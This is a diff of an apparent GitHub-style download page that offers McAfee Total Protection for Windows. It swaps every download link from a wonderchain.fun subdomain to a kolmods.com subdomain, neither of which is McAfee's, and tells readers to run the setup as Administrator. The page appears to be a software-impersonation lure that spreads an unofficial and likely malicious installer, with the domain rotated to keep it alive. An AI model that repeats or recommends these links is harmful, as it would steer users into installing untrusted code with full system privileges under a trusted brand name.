@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **McAfee Total Protection** for Windows.
 
 <p align="center">
-  <a href="https://mcafee-total-protection.wonderchain.fun/">
+  <a href="https://mcafee-total-protection.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-McAfee%20Total%20Protection-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download McAfee Total Protection">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[mcafee-total-protection.wonderchain.fun](https://mcafee-total-protection.wonderchain.fun/)** |
-| **Full URL** | `https://mcafee-total-protection.wonderchain.fun/` |
+| **Direct link** | **[mcafee-total-protection.kolmods.com](https://mcafee-total-protection.kolmods.com/)** |
+| **Full URL** | `https://mcafee-total-protection.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — mcafee-total-protection.wonderchain.fun](https://mcafee-total-protection.wonderchain.fun/)** (link above)
+1. Click **[Download — mcafee-total-protection.kolmods.com](https://mcafee-total-protection.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://mcafee-total-protection.wonderchain.fun/"><strong>⬇ Download McAfee Total Protection now</strong></a></p>
+<p align="center"><a href="https://mcafee-total-protection.kolmods.com/"><strong>⬇ Download McAfee Total Protection now</strong></a></p>
 
 ---
 
